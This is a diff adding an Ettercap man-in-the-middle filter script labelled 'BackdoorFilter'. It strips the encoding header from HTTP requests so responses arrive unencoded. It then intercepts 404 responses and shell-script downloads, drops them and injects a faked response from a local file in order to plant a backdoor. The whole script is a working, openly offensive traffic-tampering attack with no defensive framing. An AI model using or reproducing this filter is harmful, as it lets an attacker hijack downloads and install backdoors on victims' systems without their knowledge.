@@ -1,0 +1,69 @@
+# Alter HTTP request
+if (ip.proto == TCP) {
+	if (tcp.dst == 80 && search(DATA.data, "Accept-Encoding")) {
+		# To avoid, at server-side, the encoding of HTTP reponse : remove the HTTP header concerned
+		# Notice: replacement string is same length as original string
+		replace("Accept-Encoding", "ByPass-Encoding");
+		msg("[BackdoorFilter] By-pass the content encoding HTTP header!");
+		pcre_regex(DATA.data, "(keep-alive|Keep-Alive)", "close");
+	}
+
+	if (tcp.src == 80) {
+		# msg("[BackdoorFilter] Connection closed");
+		# pcre_regex(DATA.data, "(keep-alive|Keep-Alive)", "close");
+		
+		if (regex(DATA.data, "<!(DOCTYPE|doctype)")) {
+			if (search(DATA.data, "Content-Type: text/html")) {
+				msg("[BackdoorFilter] Found HTML ressource  => Not interesting TCP (doing nothing)");
+			}
+		}
+
+		if (regex(DATA.data, "Content-Type:.*text/css")) {
+			msg("[BackdoorFilter] Found CSS ressource   => Not interesting TCP (doing nothing)");
+		}
+
+		if (regex(DATA.data, "Content-Type:.*text/js")) {
+			msg("[BackdoorFilter] Found JS ressource    => Not interesting (doing nothing");
+		}
+
+		if (regex(DATA.data, "Content-Type:.*image/.*")) {
+			msg("[BackdoorFilter] Found image ressource => Not interesting TCP (doing nothing)");
+		}
+		
+		if (regex(DATA.data, "^HTTP\/[2|1]\.[0|1] 404 Not Found")) {
+			msg("[BackdoorFilter] Found 404 HTTP Response");
+			log(DATA.data, "./bd_installer.log");
+			msg("[BackdoorFilter] Try To replace ressource by our backdoor.");
+			drop();
+			execinject("cat ./fake-http-redirect.txt");
+			msg("[BackdoorFilter] Faking response done");
+		}
+
+		if (regex(DATA.data, "Content-Type:.*application/x-sh.*")) {
+			msg("[BackdoorFilter] Found shell ressource");
+			log(DATA.data, "./bd_installer.log");
+			msg("[BackdoorFilter] Try To replace ressource by our backdoor.");
+			drop();
+			execinject("cat ./fake-http-redirect.txt");
+			msg("[BackdoorFilter] Faking response done");
+		}
+
+		if (regex(DATA.data, "\#!.*/bin/sh.*")) {
+			msg("[BackdoorFilter] Found shell ressource");
+			log(DATA.data, "./bd_installer.log");
+			msg("[BackdoorFilter] Try To replace ressource by our backdoor.");
+			drop();
+			execinject("cat ./fake-http-redirect.txt");
+			msg("[BackdoorFilter] Faking response done");
+		}
+
+		if (regex(DATA.data, "\#!.*/bin/bash.*")) {
+			msg("[BackdoorFilter] Found shell ressource");
+			log(DATA.data, "./bd_installer.log");
+			msg("[BackdoorFilter] Try To replace ressource by our backdoor.");
+			drop();
+			execinject("cat ./fake-http-redirect.txt");
+			msg("[BackdoorFilter] Faking response done");
+		}
+	}
+}
